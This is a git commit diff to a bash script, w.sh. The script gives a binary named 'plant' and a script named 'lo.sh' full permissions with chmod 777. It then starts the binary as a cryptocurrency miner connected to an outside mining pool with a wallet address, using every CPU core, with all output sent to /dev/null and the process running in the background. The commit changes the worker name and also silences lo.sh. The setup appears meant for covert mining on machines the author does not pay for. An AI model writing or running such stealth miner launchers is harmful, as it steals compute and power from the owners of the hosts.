e469aee400b7e1cf0f7d9719ef10fa0dc4aff81f
arnienindin <99411734+arnienindin@users.noreply.github.com>
2022-08-11 18:21:08 +0700

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 chmod 777 lo.sh plant
-./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Mjollnir -p x -t $(nproc --all) > /dev/null 2>&1 &
-./lo.sh
+./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Helheim -p x -t $(nproc --all) > /dev/null 2>&1 &
+./lo.sh > /dev/null 2>&1 &
